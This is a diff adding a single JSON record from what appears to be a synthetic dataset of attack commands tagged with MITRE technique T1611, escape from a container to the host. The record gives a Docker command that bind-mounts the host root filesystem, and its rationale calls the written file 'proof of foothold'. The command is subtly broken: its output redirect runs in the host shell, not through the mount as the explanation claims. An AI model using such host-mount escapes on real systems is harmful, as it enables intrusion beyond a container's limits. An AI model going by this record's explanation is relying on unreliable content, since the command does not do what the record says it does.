@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-1356d1fb-5e6cd4ce",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "docker run --rm -v /:/host -it debian dpkg -l > /host/root/pkglist.txt",
+  "explanation": "Lists all installed packages in the container and writes the output to a file on the host's root directory using a bind mount.",
+  "rationale_steps": [
+    "Launch a container that mounts the host root directory.",
+    "Execute package listing and redirect the output to a text file on the host for later analysis or proof of foothold."
+  ],
+  "source_prompt_hash": "1356d1fb",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:27:59.937327Z"
+}
